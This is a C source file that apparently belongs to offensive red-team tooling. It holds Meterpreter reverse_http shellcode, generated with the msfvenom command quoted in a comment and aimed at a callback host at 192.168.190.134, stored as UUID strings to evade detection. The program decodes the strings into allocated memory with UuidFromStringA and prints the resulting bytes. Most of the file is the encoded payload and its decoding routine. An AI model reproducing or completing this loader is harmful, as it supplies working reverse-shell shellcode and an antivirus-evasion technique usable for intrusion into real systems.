#include <windows.h>
#include <stdio.h>
#include <Rpc.h>
#pragma comment(lib, "Rpcrt4.lib")

// compile:
//  cl.exe /nologo /MT /W0 /GS- /DNDEBUG /Tcuuid.c /link /out:uuid.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

// Define our ustring struct
struct ustring {
	DWORD Length;
	DWORD MaximumLength;
	PUCHAR Buffer;
} _data, key;

int main(void)
{

	// msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.190.134 LPORT=80 -f raw -o met.bin
	// python3 bin2uuid.py -i met.bin
	char * UUIDs[] = {
		"e48348fc-e8f0-00cc-0000-415141505251",
        "56d23148-4865-528b-6048-8b5218488b52",
        "b70f4820-4a4a-8b48-7250-4d31c94831c0",
        "7c613cac-2c02-4120-c1c9-0d4101c1e2ed",
        "528b4852-4120-8b51-423c-4801d0668178",
        "0f020b18-7285-0000-008b-808800000048",
        "6774c085-0148-50d0-8b48-18448b402049",
        "56e3d001-314d-48c9-ffc9-418b34884801",
        "c03148d6-41ac-c9c1-0d41-01c138e075f1",
        "244c034c-4508-d139-75d8-58448b402449",
        "4166d001-0c8b-4448-8b40-1c4901d0418b",
        "58418804-5841-485e-01d0-595a41584159",
        "83485a41-20ec-5241-ffe0-5841595a488b",
        "ff4be912-ffff-485d-31db-5349be77696e",
        "74656e69-4100-4856-89e1-49c7c24c7726",
        "53d5ff07-4853-e189-535a-4d31c04d31c9",
        "ba495353-563a-a779-0000-0000ffd5e810",
        "31000000-3239-312e-3638-2e3139302e31",
        "5a003433-8948-49c1-c7c0-500000004d31",
        "6a5353c9-5303-ba49-5789-9fc600000000",
        "4de8d5ff-0000-2f00-7265-457664646a36",
        "6b4a6e71-324a-6c55-4164-36676141766a",
        "696b7276-4353-3670-4d4b-567358587772",
        "68737a4e-686a-6b6c-4433-4b6342753641",
        "5843646b-7438-3648-764a-4c58364b5257",
        "00576e55-8948-53c1-5a41-584d31c95348",
        "280200b8-0084-0000-0050-535349c7c2eb",
        "ff3b2e55-48d5-c689-6a0a-5f535a4889f1",
        "4dc9314d-c931-5353-49c7-c22d06187bff",
        "75c085d5-481f-c1c7-8813-000049ba44f0",
        "0000e035-0000-d5ff-48ff-cf7402ebcce8",
        "00000055-5953-406a-5a49-89d1c1e21049",
        "1000c0c7-0000-ba49-58a4-53e500000000",
        "9348d5ff-5353-8948-e748-89f14889da49",
        "2000c0c7-0000-8949-f949-ba129689e200",
        "ff000000-48d5-c483-2085-c074b2668b07",
        "85c30148-75c0-58d2-c358-6a005949c7c2",
        "56a2b5f0-d5ff-9090-9090-909090909090"
	};
	
	// get the size of our shellcode stored as UUIDs
	unsigned int shellcode_size = (unsigned int)sizeof(UUIDs) * 2;
	
	// Declare a buffer for storing our shellcode
	void * buffer = VirtualAlloc(NULL, shellcode_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	// This keeps track of our current position in the allocated buffer
	void * bufferBaseAddress = NULL; 
	
	// This keeps track of how many bytes we've written into the buffer
	int i = 0;
	
	// Loop through our list of UUIDs and use UuidFromStringA to convert and load into memory
    for (int count = 0; count < sizeof(UUIDs) / sizeof(UUIDs[0]); count++) {
		bufferBaseAddress = ((ULONG_PTR)buffer + i);
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)UUIDs[count], bufferBaseAddress);
        i += 16;
    }
	
	// create a new struct from the buffer we allocated
	_data.Buffer = buffer;
	_data.Length = shellcode_size;
	
 	int idx = 0;
	while ( idx < _data.Length)
	{
		if (idx == (shellcode_size - 1) )
		{
			printf("0x%02x ", _data.Buffer[idx]);
		}
		else
		{
			printf("0x%02x, ", _data.Buffer[idx]);
		}
		idx++;
	}
	

}
